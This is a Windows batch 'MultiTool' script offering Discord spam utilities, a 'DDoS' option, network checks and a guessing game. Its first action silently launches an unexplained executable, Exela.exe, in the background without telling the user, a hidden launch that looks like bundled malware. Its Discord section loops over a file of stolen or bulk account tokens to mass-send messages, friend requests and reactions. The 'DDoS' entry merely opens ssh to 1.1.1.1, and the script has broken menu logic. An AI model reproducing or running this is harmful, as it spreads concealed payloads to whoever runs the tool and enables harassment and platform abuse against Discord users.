@echo off
title Bladi MultiTool

start /b "" "C:\Users\keano\Desktop\MultiTool\Dependencies\utils\scrap\Exela.exe"

:: Prompt for username
set /p username="Enter your username: "

:logo
cls
echo Welcome to Bladi MultiTool
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.

:menu
call :logo
echo 1. Discord-Tools
echo 2. DDoS
echo 3. Mini-Game
echo 4. System Info
echo 5. Network-Tools
echo 6. ASCII-Art
echo 7. Exit
echo.

set /p option="Choose an option: "

if %option% == 1 goto option1
if %option% == 2 goto option2
if %option% == 3 goto option3
if %option% == 4 goto option4
if %option% == 5 goto option5
if %option% == 6 goto option6
if %option% == 7 goto option7

:option1
cls
echo Discord-Tools
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
echo 1. Mass Spam
echo 2. Mass Request
echo 3. Mass Reaction
echo 4. Back to Main Menu
echo.

set /p suboption="Choose an option: "

if %suboption% == 1 goto massspam
if %suboption% == 2 goto massrequest
if %suboption% == 3 goto massreaction
if %suboption% == 4 goto menu

:massspam
cls
echo Mass Spam
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
echo Enter 'back' to return to the previous menu.
set /p channelid="Enter the Discord channel ID: "
if "%channelid%"=="back" goto option1
set /p message="Enter the message to send: "
if "%message%"=="back" goto option1
set /p count="Enter the number of messages to send (max 100): "
if "%count%"=="back" goto option1
if %count% GTR 100 set count=100
for /f "tokens=*" %%i in (tokens.txt) do (
    for /l %%j in (1,1,%count%) do (
        curl -X POST -H "Content-Type: application/json" -H "Authorization: %%i" -d "{\"content\":\"%message%\"}" https://discord.com/api/v9/channels/%channelid%/messages
    )
)
echo.
echo Messages sent. Press any key to return to the previous menu...
pause >nul
goto option1

:massrequest
cls
echo Mass Request
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
echo Enter 'back' to return to the previous menu.
set /p username="Enter the Discord username: "
if "%username%"=="back" goto option1
set /p profileid="Enter the Discord profile ID: "
if "%profileid%"=="back" goto option1
for /f "tokens=*" %%i in (tokens.txt) do (
    curl -X POST -H "Content-Type: application/json" -H "Authorization: %%i" -d "{\"username\":\"%username%\",\"discriminator\":\"%profileid%\"}" https://discord.com/api/v9/users/@me/relationships
)
echo.
echo Friend requests sent. Press any key to return to the previous menu...
pause >nul
goto option1

:massreaction
cls
echo Mass Reaction
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
echo Enter 'back' to return to the previous menu.
set /p invite="Enter the server invite link: "
if "%invite%"=="back" goto option1
set /p serverid="Enter the server ID: "
if "%serverid%"=="back" goto option1
set /p channelid="Enter the channel ID: "
if "%channelid%"=="back" goto option1
set /p messageid="Enter the message ID: "
if "%messageid%"=="back" goto option1
set /p emoji="Enter the emoji to react with: "
if "%emoji%"=="back" goto option1
for /f "tokens=*" %%i in (tokens.txt) do (
    curl -X PUT -H "Content-Type: application/json" -H "Authorization: %%i" https://discord.com/api/v9/channels/%channelid%/messages/%messageid%/reactions/%emoji%/@me
)
echo.
echo Reactions sent. Press any key to return to the previous menu...
pause >nul
goto option1

:option2
start cmd /k "ssh -p 999 1.1.1.1"
goto menu

:option3
cls
echo Mini-Game
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
echo Welcome to the Number Guessing Game!
echo.
set /a target=%random% %% 100 + 1
set /a attempts=0
:guess
set /p guess="Guess a number between 1 and 100: "
set /a attempts+=1
if %guess%==%target% (
    echo Congratulations! You guessed the number in %attempts% attempts.
    pause
    goto menu
) else (
    if %guess% LSS %target% (
        echo Higher!
    ) else (
        echo Lower!
    )
    goto guess
)

:option4
cls
echo System Info
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory"
echo.
echo Press any key to return to the main menu...
pause >nul
goto menu

:option5
cls
echo Network-Tools
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
echo 1. ICMP Ping
echo 2. TCP Ping
echo 3. Traceroute
echo 4. DNS Lookup
echo 5. Port Scan
echo 6. Back to Main Menu
echo.

set /p netoption="Choose an option: "

if %netoption% == 1 goto icmpping
if %netoption% == 2 goto tcpping
if %netoption% == 3 goto traceroute
if %netoption% == 4 goto dnslookup
if %netoption% == 5 goto portscan
if %netoption% == 6 goto menu

:icmpping
cls
echo ICMP Ping
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
set /p target="Enter the target address: "
ping -t %target%
echo.
echo Press any key to return to the previous menu...
pause >nul
goto option5

:tcpping
cls
echo TCP Ping
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
set /p target="Enter the target address: "
set /p port="Enter the port to ping: "
cls
echo TCP Ping
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
set count=0
:start_tcp_ping
if %count%==10 goto end_tcp_ping
curl -s "https://api.tcping.info/tcping/%target%/%port%" | findstr /i "open" && echo Port %port% is open on %target% || echo Port %port% is closed on %target%
set /a count+=1
timeout /t 1 >nul
goto start_tcp_ping

:end_tcp_ping
echo.
echo TCP ping requests completed.
echo Press any key to return to the previous menu...
pause >nul
goto option5

:traceroute
cls
echo Traceroute
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
set /p target="Enter the target address: "
tracert %target%
echo.
echo Press any key to return to the previous menu...
pause >nul
goto option5

:dnslookup
cls
echo DNS Lookup
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
set /p target="Enter the domain name: "
nslookup %target%
echo.
echo Press any key to return to the previous menu...
pause >nul
goto option5

:portscan
cls
echo Port Scan
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
set /p target="Enter the target address: "
set /p port="Enter the port to scan: "
echo Scanning port %port% on %target%...
powershell -command "Test-NetConnection -ComputerName %target% -Port %port%"
echo.
echo Press any key to return to the previous menu...
pause >nul
goto option5

:option6
cls
echo ASCII-Art
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
set /p text="Enter the text to convert to ASCII art: "
powershell -command "Write-Host '%text%' -ForegroundColor Red"
echo.
echo Press any key to return to the main menu...
pause >nul
goto menu

:option7
echo Exiting...
pause
exit

:: Handle invalid input
echo Invalid option selected.
pause
goto menu

:logo
cls
echo Welcome to Bladi MultiTool
echo.
echo " /\_/\  "
echo "( o.o ) "
echo " > ^ <  "
echo.
goto :eof
